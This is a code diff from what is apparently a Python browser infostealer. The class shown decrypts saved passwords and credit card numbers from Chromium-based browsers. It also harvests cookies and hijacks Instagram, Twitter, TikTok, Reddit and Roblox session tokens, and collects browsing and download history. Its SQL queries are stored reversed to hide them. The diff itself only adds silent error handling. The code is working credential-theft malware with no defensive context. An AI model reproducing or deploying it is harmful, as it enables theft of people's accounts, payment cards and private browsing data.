@@ -89,179 +89,194 @@ class ChromeLoginData:
             except:
                 return "None"
     def connect_to_database(self, value, value2, asd):
-        path = f"{value}\\{value2}" + "\\Login Data"
-        profPath = f"{value}\\{value2}"
-        if "Opera" in path:
-            if "Profile" in path:
+        try:
+            path = f"{value}\\{value2}" + "\\Login Data"
+            profPath = f"{value}\\{value2}"
+            if "Opera" in path:
+                if "Profile" in path:
+                    return
+                else:
+                    path = path.replace("\\Default", "")
+                    profPath = profPath.replace("\\Default", "")
+            if not os.path.isfile(path):
                 return
             else:
-                path = path.replace("\\Default", "")
-                profPath = profPath.replace("\\Default", "")
-        if not os.path.isfile(path):
-            return
-        else:
-            try:
-                ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-            except:
-                ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
-            self.login_data_path = path
-            shutil.copy2(self.login_data_path, self.backup_login_data_path)
-            conn = sqlite3.connect(self.backup_login_data_path)
-            cursor = conn.cursor()
-            query = self.reverseToNormal('snigol MORF eulav_drowssap ,eulav_emanresu ,lru_nigiro TCELES')
-            cursor.execute(query)
-            logins = cursor.fetchall()
-            conn.close()
-            os.remove(self.backup_login_data_path)
-            for login in logins:
-                if login[1] and login[2]:
-                    self.passws +=1
-                    url = login[0]
-                    username = login[1]
-                    password = self.decrypt_pw(login[2], self.get_encryption_key(value))
-                    self.passw.append("URL : " + url )
-                    self.passw.append("Username : " + username )
-                    self.passw.append("Password : " + password )
-                    self.passw.append("Browser : " + profil_kismi)
-                    self.passw.append("=" * 50)
+                try:
+                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
+                except:
+                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
+                self.login_data_path = path
+                shutil.copy2(self.login_data_path, self.backup_login_data_path)
+                conn = sqlite3.connect(self.backup_login_data_path)
+                cursor = conn.cursor()
+                query = self.reverseToNormal('snigol MORF eulav_drowssap ,eulav_emanresu ,lru_nigiro TCELES')
+                cursor.execute(query)
+                logins = cursor.fetchall()
+                conn.close()
+                os.remove(self.backup_login_data_path)
+                for login in logins:
+                    if login[1] and login[2]:
+                        self.passws +=1
+                        url = login[0]
+                        username = login[1]
+                        password = self.decrypt_pw(login[2], self.get_encryption_key(value))
+                        self.passw.append("URL : " + url )
+                        self.passw.append("Username : " + username )
+                        self.passw.append("Password : " + password )
+                        self.passw.append("Browser : " + profil_kismi)
+                        self.passw.append("=" * 50)
+        except:
+            pass
     def connect_to_database2(self, value, value2, asd):
-        path = f"{value}\\{value2}" + "\\Web Data"
-        profPath = f"{value}\\{value2}"
-        if "Opera" in path:
-            if "Profile" in path:
+        try:
+            path = f"{value}\\{value2}" + "\\Web Data"
+            profPath = f"{value}\\{value2}"
+            if "Opera" in path:
+                if "Profile" in path:
+                    return
+                else:
+                    path = path.replace("\\Default", "")
+                    profPath = profPath.replace("\\Default", "")
+            if not os.path.isfile(path):
                 return
             else:
-                path = path.replace("\\Default", "")
-                profPath = profPath.replace("\\Default", "")
-        if not os.path.isfile(path):
-            return
-        else:
-            #print(path)
-            try:
-                ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-            except:
-                ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
-            self.login_data_path = path
-            shutil.copy2(self.login_data_path, self.backup_login_data_path)
-            conn = sqlite3.connect(self.backup_login_data_path)
-            cursor = conn.cursor()
-            query = self.reverseToNormal('sdrac_tiderc morf drac_no_eman ,htnom_noitaripxe ,raey_noitaripxe ,detpyrcne_rebmun_drac tceles')
-            cursor.execute(query)
-            logins = cursor.fetchall()
-            conn.close()
-            os.remove(self.backup_login_data_path)
-            for cc in logins:
-                if cc[0]:
-                    self.cc +=1
-                    if cc[2] < 10:
-                        month = "0"  + f"{cc[2]}"
-                    else:month = cc[2]
-                    self.ottomonCC.append(str(self.decrypt_pw(cc[0], self.get_encryption_key(value))) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
+                #print(path)
+                try:
+                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
+                except:
+                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
+                self.login_data_path = path
+                shutil.copy2(self.login_data_path, self.backup_login_data_path)
+                conn = sqlite3.connect(self.backup_login_data_path)
+                cursor = conn.cursor()
+                query = self.reverseToNormal('sdrac_tiderc morf drac_no_eman ,htnom_noitaripxe ,raey_noitaripxe ,detpyrcne_rebmun_drac tceles')
+                cursor.execute(query)
+                logins = cursor.fetchall()
+                conn.close()
+                os.remove(self.backup_login_data_path)
+                for cc in logins:
+                    if cc[0]:
+                        self.cc +=1
+                        if cc[2] < 10:
+                            month = "0"  + f"{cc[2]}"
+                        else:month = cc[2]
+                        self.ottomonCC.append(str(self.decrypt_pw(cc[0], self.get_encryption_key(value))) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
+        except:
+            pass
     def connect_to_database3(self, value, value2, asd):
-        path = f"{value}\\{value2}" + "\\Network\\Cookies"
-        profPath = f"{value}\\{value2}"
-        if "Opera" in path:
-            if "Profile" in path:
+        try:
+            path = f"{value}\\{value2}" + "\\Network\\Cookies"
+            profPath = f"{value}\\{value2}"
+            if "Opera" in path:
+                if "Profile" in path:
+                    return
+                else:
+                    path = path.replace("\\Default", "")
+                    profPath = profPath.replace("\\Default", "")
+            if not os.path.isfile(path):
                 return
             else:
-                path = path.replace("\\Default", "")
-                profPath = profPath.replace("\\Default", "")
-        if not os.path.isfile(path):
-            return
-        else:
-            #print(path)
-            try:
-                ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-            except:
-                ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
-            profil_kismi = profil_kismii.replace("_", " ")
-            self.login_data_path = path
-            shutil.copy2(self.login_data_path, self.backup_login_data_path)
-            conn = sqlite3.connect(self.backup_login_data_path)
-            cursor = conn.cursor()
-            query = self.reverseToNormal('seikooc morf ctu_seripxe,eulav_detpyrcne ,htap ,eman ,yek_tsoh tceles')
-            cursor.execute(query)
-            logins = cursor.fetchall()
-            conn.close()
-            os.remove(self.backup_login_data_path)
-            for cookie in logins:
-                if cookie[3]:
-                    self.cookie += 1
-                    if cookie[4] == 0:
-                        entry = "FALSE"
-                    else:entry= "TRUE"
-                    if str(cookie[0]).startswith('.'):entry2 = "FALSE"
-                    else:entry2='TRUE'
-                    cooked = self.decrypt_pw(cookie[3],self.get_encryption_key(value))
-                    self.cookeds.append(f"{cookie[0]}\t{entry}\{cookie[2]}\t{entry2}\t{cookie[1]}\t{cooked}")
-                    if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
-                        self.setInstaSession(cooked, profil_kismi)
-                    if "twitter" in str(cookie[0]).lower() and "auth_token" in str(cookie[1]).lower():
-                        self.setTwitterSession(cooked, profil_kismi)
-                    if "tiktok" in str(cookie[0]).lower() and str(cookie[1]).lower() == "sessionid":
-                        self.setTiktokSession(cooked, profil_kismi)
-                    if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
-                        self.setRedditSession(cooked, profil_kismi)
-                    if "roblox" in str(cookie[0]).lower() and ".ROBLOSECURITY" in str(cookie[1]):
-                        self.setRoblox(cooked, profil_kismi)
+                #print(path)
+                try:
+                    ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
+                except:
+                    ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
+                profil_kismi = profil_kismii.replace("_", " ")
+                self.login_data_path = path
+                shutil.copy2(self.login_data_path, self.backup_login_data_path)
+                conn = sqlite3.connect(self.backup_login_data_path)
+                cursor = conn.cursor()
+                query = self.reverseToNormal('seikooc morf ctu_seripxe,eulav_detpyrcne ,htap ,eman ,yek_tsoh tceles')
+                cursor.execute(query)
+                logins = cursor.fetchall()
+                conn.close()
+                os.remove(self.backup_login_data_path)
+                for cookie in logins:
+                    if cookie[3]:
+                        self.cookie += 1
+                        if cookie[4] == 0:
+                            entry = "FALSE"
+                        else:entry= "TRUE"
+                        if str(cookie[0]).startswith('.'):entry2 = "FALSE"
+                        else:entry2='TRUE'
+                        cooked = self.decrypt_pw(cookie[3],self.get_encryption_key(value))
+                        self.cookeds.append(f"{cookie[0]}\t{entry}\{cookie[2]}\t{entry2}\t{cookie[1]}\t{cooked}")
+                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
+                            self.setInstaSession(cooked, profil_kismi)
+                        if "twitter" in str(cookie[0]).lower() and "auth_token" in str(cookie[1]).lower():
+                            self.setTwitterSession(cooked, profil_kismi)
+                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]).lower() == "sessionid":
+                            self.setTiktokSession(cooked, profil_kismi)
+                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
+                            self.setRedditSession(cooked, profil_kismi)
+                        if "roblox" in str(cookie[0]).lower() and ".ROBLOSECURITY" in str(cookie[1]):
+                            self.setRoblox(cooked, profil_kismi)
+        except:
+            pass
     def connect_to_database4(self, value, value2, asd):
-        path = f"{value}\\{value2}" + "\\History"
-        profPath = f"{value}\\{value2}"
-        if "Opera" in path:
-            if "Profile" in path:
+        try:
+            path = f"{value}\\{value2}" + "\\History"
+            profPath = f"{value}\\{value2}"
+            if "Opera" in path:
+                if "Profile" in path:
+                    return
+                else:
+                    path = path.replace("\\Default", "")
+                    profPath = profPath.replace("\\Default", "")
+            if not os.path.isfile(path):
                 return
             else:
-                path = path.replace("\\Default", "")
-                profPath = profPath.replace("\\Default", "")
-        if not os.path.isfile(path):
-            return
-        else:
-            try:
-                ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-            except:
-                ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
-            self.login_data_path = path
-            shutil.copy2(self.login_data_path, self.backup_login_data_path)
-            conn = sqlite3.connect(self.backup_login_data_path)
-            cursor = conn.cursor()
-            query = self.reverseToNormal('sdaolnwod morf htap_tegrat ,lru_bat tceles')
-            cursor.execute(query)
-            logins = cursor.fetchall()
-            conn.close()
-            os.remove(self.backup_login_data_path)
-            for dwnlds in logins:
-                if dwnlds[0] or dwnlds[1]:
-                    self.downloads += 1
-                    self.sexDonwloads.append(f"{dwnlds[0]} : {dwnlds[1]}")
+                try:
+                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
+                except:
+                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
+                self.login_data_path = path
+                shutil.copy2(self.login_data_path, self.backup_login_data_path)
+                conn = sqlite3.connect(self.backup_login_data_path)
+                cursor = conn.cursor()
+                query = self.reverseToNormal('sdaolnwod morf htap_tegrat ,lru_bat tceles')
+                cursor.execute(query)
+                logins = cursor.fetchall()
+                conn.close()
+                os.remove(self.backup_login_data_path)
+                for dwnlds in logins:
+                    if dwnlds[0] or dwnlds[1]:
+                        self.downloads += 1
+                        self.sexDonwloads.append(f"{dwnlds[0]} : {dwnlds[1]}")
+        except:
+            pass
     def connect_to_database5(self, value, value2, asd):
-        path = f"{value}\\{value2}" + "\\History"
-        profPath = f"{value}\\{value2}"
-        if "Opera" in path:
-            if "Profile" in path:
+        try:
+            path = f"{value}\\{value2}" + "\\History"
+            profPath = f"{value}\\{value2}"
+            if "Opera" in path:
+                if "Profile" in path:
+                    return
+                else:
+                    path = path.replace("\\Default", "")
+                    profPath = profPath.replace("\\Default", "")
+            if not os.path.isfile(path):
                 return
             else:
-                path = path.replace("\\Default", "")
-                profPath = profPath.replace("\\Default", "")
-        if not os.path.isfile(path):
-            return
-        else:
-            try:
-                ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-            except:
-                ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
-            self.login_data_path = path
-            shutil.copy2(self.login_data_path, self.backup_login_data_path)
-            conn = sqlite3.connect(self.backup_login_data_path)
-            cursor = conn.cursor()
-            query = self.reverseToNormal('slru morf emit_tisiv_tsal ,tnuoc_tisiv ,eltit ,lru ,di tceles')
-            cursor.execute(query)
-            logins = cursor.fetchall()
-            conn.close()
-            os.remove(self.backup_login_data_path)
-            for hstrys in logins:
-                if hstrys[0] or hstrys[1]:
-                    self.historys +=1
-                    self.sexHistorys.append(f"ID : {hstrys[0]} | URL : {hstrys[1]} | Title : {hstrys[2]} | Visit Count : {hstrys[3]} | Last Visit Time {hstrys[4]}")
+                try:
+                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
+                except:
+                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
+                self.login_data_path = path
+                shutil.copy2(self.login_data_path, self.backup_login_data_path)
+                conn = sqlite3.connect(self.backup_login_data_path)
+                cursor = conn.cursor()
+                query = self.reverseToNormal('slru morf emit_tisiv_tsal ,tnuoc_tisiv ,eltit ,lru ,di tceles')
+                cursor.execute(query)
+                logins = cursor.fetchall()
+                conn.close()
+                os.remove(self.backup_login_data_path)
+                for hstrys in logins:
+                    if hstrys[0] or hstrys[1]:
+                        self.historys +=1
+                        self.sexHistorys.append(f"ID : {hstrys[0]} | URL : {hstrys[1]} | Title : {hstrys[2]} | Visit Count : {hstrys[3]} | Last Visit Time {hstrys[4]}")
+        except:
+            pass
     def setInstaSession(self, cookie, value):
         try:
             pp = "https://i.hizliresim.com/8po0puy.jfif"
